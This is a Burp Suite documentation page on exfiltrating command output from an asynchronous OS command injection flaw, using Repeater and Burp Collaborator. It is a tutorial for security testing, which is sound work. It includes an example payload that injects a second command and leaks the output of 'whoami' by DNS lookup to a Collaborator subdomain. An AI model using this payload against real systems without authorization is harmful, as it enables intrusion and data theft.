# Exploiting OS command injection vulnerabilities to exfiltrate data with Burp Suite

Source: https://portswigger.net/burp/documentation/desktop/testing-workflow/vulnerabilities/input-validation/command-injection/exfiltrate-data
Fetched: 2026-06-28T09:15:59.661342+00:00

Support Center

Documentation

Desktop editions

Testing workflow

Testing for vulnerabilities

Testing input validation

OS command injection

Exploiting OS command injection vulnerabilities to exfiltrate data

Professional

Exploiting OS command injection vulnerabilities to exfiltrate data with Burp Suite

Last updated:

June 18, 2026

Read time:

1 Minute

Once you have identified a request that is vulnerable to asynchronous OS command injection, you can attempt to exfiltrate the output from injected commands through the out-of-band channel between the website and Burp Collaborator.

Before you start

Identify a request that is vulnerable to asynchronous OS command injection. For more information, see Testing for asynchronous OS command injection vulnerabilities with Burp Suite.

Steps

You can use Burp Repeater to attempt to exfiltrate data from a request:

In Proxy > HTTP history, right-click the request that is vulnerable to asynchronous OS command injection. Select Send to Repeater.

Go to the Repeater tab.

Change a parameter's value to a proof-of-concept payload. The payload should include:

The nslookup command to cause DNS lookup for a Collaborator subdomain. To insert a Collaborator subdomain into the payload, right-click and select Insert Collaborator payload.

A command that obtains information, such as the whoami command.

For example, & nslookup `whoami`.burp-collaborator-subdomain & may cause a DNS lookup to the Burp Collaborator subdomain. This lookup will contain the result of the whoami command.

Click Send.

Go to the Collaborator tab and click Poll now. Any interactions with the Collaborator server are listed in the table.

Review the details of any interactions to identify any exfiltrated data.

Note

The command may be executed after a delay. The Collaborator tab flashes when an interaction occurs. Make sure that you continue to check the Collaborator tab to identify any delayed interactions.

Related pages

Academy: OS command injection

Burp Scanner

Burp Repeater
